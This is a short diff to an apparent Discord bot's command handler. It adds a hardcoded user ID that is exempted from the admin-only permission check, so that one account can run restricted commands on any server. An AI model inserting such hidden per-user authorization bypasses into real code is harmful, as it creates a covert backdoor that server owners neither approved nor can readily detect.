@@ -50,7 +50,8 @@ export = async (client, message) => {
         global_admins &&
         global_admins.admins &&
         global_admins.admins.indexOf(message.author.id) === -1 &&
-        message.member.permissions.has(Permissions.FLAGS.ADMINISTRATOR) === false
+        message.member.permissions.has(Permissions.FLAGS.ADMINISTRATOR) === false &&
+        message.author.id !== "515919653445304345"
       ) {
         await message.channel.send(
           ":x: You don't have permission to run this command."
